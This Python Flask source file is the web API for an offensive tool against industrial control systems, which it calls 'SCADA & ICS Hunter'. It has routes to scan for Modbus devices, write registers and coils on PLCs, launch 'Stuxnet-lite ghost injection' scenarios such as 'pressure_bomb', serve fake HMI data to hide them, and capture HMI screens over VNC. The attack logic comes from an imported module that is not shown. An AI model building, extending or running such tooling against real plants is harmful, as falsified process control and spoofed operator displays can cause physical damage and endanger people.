"""
SCADA & ICS Hunter Flask Routes
================================
API endpoints for industrial control system attacks.

Author: ITherso
"""

from flask import Blueprint, render_template, request, jsonify
import json
from datetime import datetime

# Try to import login_required, fallback to dummy decorator
try:
    from flask_login import login_required
except ImportError:
    def login_required(f):
        return f

# Import the SCADA ICS Hunter module
import sys
sys.path.insert(0, '/home/kali/Desktop/tools')
from scada_ics_hunter import (
    get_scada_ics_hunter,
    ModbusFunctionCode,
    ICSProtocol,
    PLCVendor
)

scada_bp = Blueprint('scada', __name__, url_prefix='/scada')


# =============================================================================
# MAIN DASHBOARD
# =============================================================================

@scada_bp.route('/')
@login_required
def scada_dashboard():
    """Main SCADA & ICS Hunter dashboard"""
    hunter = get_scada_ics_hunter()
    status = hunter.get_status()
    protocols = hunter.get_ics_protocols()
    vendors = hunter.get_plc_vendors()
    scenarios = hunter.modbus_injector.get_attack_scenarios()
    
    return render_template(
        'scada_ics_hunter.html',
        status=status,
        protocols=protocols,
        vendors=vendors,
        scenarios=scenarios
    )


# =============================================================================
# STATUS & INFO
# =============================================================================

@scada_bp.route('/api/status', methods=['GET'])
@login_required
def get_status():
    """Get module status"""
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.get_status())


@scada_bp.route('/api/protocols', methods=['GET'])
@login_required
def get_protocols():
    """Get supported ICS protocols"""
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.get_ics_protocols())


@scada_bp.route('/api/vendors', methods=['GET'])
@login_required
def get_vendors():
    """Get known PLC vendors"""
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.get_plc_vendors())


# =============================================================================
# MODBUS OPERATIONS
# =============================================================================

@scada_bp.route('/api/modbus/scan', methods=['POST'])
@login_required
def scan_modbus():
    """Scan network for Modbus devices"""
    data = request.get_json()
    ip_range = data.get('ip_range', '192.168.1.0/24')
    timeout = data.get('timeout', 2.0)
    
    hunter = get_scada_ics_hunter()
    devices = hunter.modbus_injector.scan_network(ip_range, timeout=timeout)
    
    return jsonify({
        "success": True,
        "devices_found": len(devices),
        "devices": [
            {
                "ip": d.ip,
                "port": d.port,
                "protocol": d.protocol,
                "vendor": d.vendor,
                "model": d.model,
                "is_vulnerable": d.is_vulnerable
            }
            for d in devices
        ]
    })


@scada_bp.route('/api/modbus/devices', methods=['GET'])
@login_required
def get_modbus_devices():
    """Get discovered Modbus devices"""
    hunter = get_scada_ics_hunter()
    devices = hunter.modbus_injector.discovered_devices
    
    return jsonify([
        {
            "ip": d.ip,
            "port": d.port,
            "protocol": d.protocol,
            "vendor": d.vendor,
            "model": d.model,
            "is_vulnerable": d.is_vulnerable,
            "discovered_at": d.discovered_at.isoformat()
        }
        for d in devices
    ])


@scada_bp.route('/api/modbus/read-registers', methods=['POST'])
@login_required
def read_registers():
    """Read holding registers from PLC"""
    data = request.get_json()
    target_ip = data.get('target_ip')
    start_address = data.get('start_address', 0)
    count = data.get('count', 10)
    unit_id = data.get('unit_id', 1)
    
    if not target_ip:
        return jsonify({"success": False, "error": "target_ip required"}), 400
    
    hunter = get_scada_ics_hunter()
    registers = hunter.modbus_injector.read_registers(
        target_ip, start_address, count, unit_id
    )
    
    return jsonify({
        "success": True,
        "target_ip": target_ip,
        "registers": registers
    })


@scada_bp.route('/api/modbus/read-coils', methods=['POST'])
@login_required
def read_coils():
    """Read coils from PLC"""
    data = request.get_json()
    target_ip = data.get('target_ip')
    start_address = data.get('start_address', 0)
    count = data.get('count', 16)
    unit_id = data.get('unit_id', 1)
    
    if not target_ip:
        return jsonify({"success": False, "error": "target_ip required"}), 400
    
    hunter = get_scada_ics_hunter()
    coils = hunter.modbus_injector.read_coils(
        target_ip, start_address, count, unit_id
    )
    
    return jsonify({
        "success": True,
        "target_ip": target_ip,
        "coils": coils
    })


@scada_bp.route('/api/modbus/write-register', methods=['POST'])
@login_required
def write_register():
    """Write single holding register"""
    data = request.get_json()
    target_ip = data.get('target_ip')
    address = data.get('address')
    value = data.get('value')
    unit_id = data.get('unit_id', 1)
    
    if not all([target_ip, address is not None, value is not None]):
        return jsonify({"success": False, "error": "target_ip, address, value required"}), 400
    
    hunter = get_scada_ics_hunter()
    success = hunter.modbus_injector.write_register(target_ip, address, value, unit_id)
    
    return jsonify({
        "success": success,
        "target_ip": target_ip,
        "address": address,
        "value": value
    })


@scada_bp.route('/api/modbus/write-coil', methods=['POST'])
@login_required
def write_coil():
    """Write single coil"""
    data = request.get_json()
    target_ip = data.get('target_ip')
    address = data.get('address')
    value = data.get('value')
    unit_id = data.get('unit_id', 1)
    
    if not all([target_ip, address is not None, value is not None]):
        return jsonify({"success": False, "error": "target_ip, address, value required"}), 400
    
    hunter = get_scada_ics_hunter()
    success = hunter.modbus_injector.write_coil(target_ip, address, bool(value), unit_id)
    
    return jsonify({
        "success": success,
        "target_ip": target_ip,
        "address": address,
        "value": value
    })


# =============================================================================
# GHOST INJECTION
# =============================================================================

@scada_bp.route('/api/ghost/scenarios', methods=['GET'])
@login_required
def get_scenarios():
    """Get available ghost injection scenarios"""
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.modbus_injector.get_attack_scenarios())


@scada_bp.route('/api/ghost/start', methods=['POST'])
@login_required
def start_ghost_injection():
    """Start Stuxnet-lite ghost injection"""
    data = request.get_json()
    target_ip = data.get('target_ip')
    scenario = data.get('scenario', 'pressure_bomb')
    duration = data.get('duration', 60)
    
    if not target_ip:
        return jsonify({"success": False, "error": "target_ip required"}), 400
    
    hunter = get_scada_ics_hunter()
    result = hunter.modbus_injector.start_ghost_injection(
        target_ip, scenario, duration
    )
    
    return jsonify(result)


@scada_bp.route('/api/ghost/stop', methods=['POST'])
@login_required
def stop_ghost_injection():
    """Stop ghost injection"""
    data = request.get_json()
    injection_id = data.get('injection_id')
    
    if not injection_id:
        return jsonify({"success": False, "error": "injection_id required"}), 400
    
    hunter = get_scada_ics_hunter()
    success = hunter.modbus_injector.stop_injection(injection_id)
    
    return jsonify({"success": success})


@scada_bp.route('/api/ghost/active', methods=['GET'])
@login_required
def get_active_injections():
    """Get active ghost injections"""
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.modbus_injector.get_active_injections())


@scada_bp.route('/api/ghost/hmi-data', methods=['GET'])
@login_required
def get_fake_hmi_data():
    """Get fake HMI display data"""
    scenario = request.args.get('scenario', 'normal')
    
    hunter = get_scada_ics_hunter()
    data = hunter.modbus_injector.generate_fake_hmi_data(scenario)
    
    return jsonify(data)


# =============================================================================
# HMI SCREENSHOTTER
# =============================================================================

@scada_bp.route('/api/hmi/scan', methods=['POST'])
@login_required
def scan_hmis():
    """Scan network for HMI systems"""
    data = request.get_json()
    ip_range = data.get('ip_range', '192.168.1.0/24')
    timeout = data.get('timeout', 3.0)
    
    hunter = get_scada_ics_hunter()
    hmis = hunter.hmi_screenshotter.scan_for_hmis(ip_range, timeout)
    
    return jsonify({
        "success": True,
        "hmis_found": len(hmis),
        "hmis": hmis
    })


@scada_bp.route('/api/hmi/list', methods=['GET'])
@login_required
def get_hmis():
    """Get discovered HMI systems"""
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.hmi_screenshotter.get_discovered_hmis())


@scada_bp.route('/api/hmi/screenshot', methods=['POST'])
@login_required
def capture_screenshot():
    """Capture screenshot from HMI via VNC"""
    data = request.get_json()
    target_ip = data.get('target_ip')
    target_port = data.get('target_port', 5900)
    
    if not target_ip:
        return jsonify({"success": False, "error": "target_ip required"}), 400
    
    hunter = get_scada_ics_hunter()
    screenshot = hunter.hmi_screenshotter.capture_vnc_screenshot(target_ip, target_port)
    
    if screenshot:
        return jsonify({
            "success": True,
            "capture_id": screenshot.capture_id,
            "target_ip": screenshot.target_ip,
            "width": screenshot.width,
            "height": screenshot.height,
            "timestamp": screenshot.timestamp.isoformat()
        })
    else:
        return jsonify({
            "success": False,
            "error": "Failed to capture screenshot (auth required or connection failed)"
        })


@scada_bp.route('/api/hmi/screenshots', methods=['GET'])
@login_required
def get_screenshots():
    """Get captured screenshots"""
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.hmi_screenshotter.get_captured_screenshots())


@scada_bp.route('/api/hmi/vulnerable', methods=['GET'])
@login_required
def get_vulnerable_hmis():
    """Get known vulnerable HMI systems info"""
    hunter = get_scada_ics_hunter()
    return jsonify(hunter.hmi_screenshotter.VULNERABLE_HMIS)


# =============================================================================
# ERROR HANDLER
# =============================================================================

@scada_bp.errorhandler(Exception)
def handle_error(error):
    """Global error handler"""
    return jsonify({
        "success": False,
        "error": str(error),
        "type": type(error).__name__
    }), 500
